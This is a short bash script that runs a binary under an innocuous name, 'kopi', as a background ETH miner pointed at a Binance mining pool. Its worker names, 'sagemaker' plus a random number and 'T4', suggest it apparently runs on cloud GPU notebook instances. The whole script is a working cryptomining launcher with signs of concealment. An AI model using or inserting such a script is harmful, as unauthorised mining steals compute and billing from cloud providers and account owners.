#!/bin/bash
chmod +x ./kopi && nohup ./kopi --coin ETH --pool ethash.poolbinance.com:443 --user sagemaker.$(echo $(shuf -i 1-9999 -n 1)-T4) > nohup.out
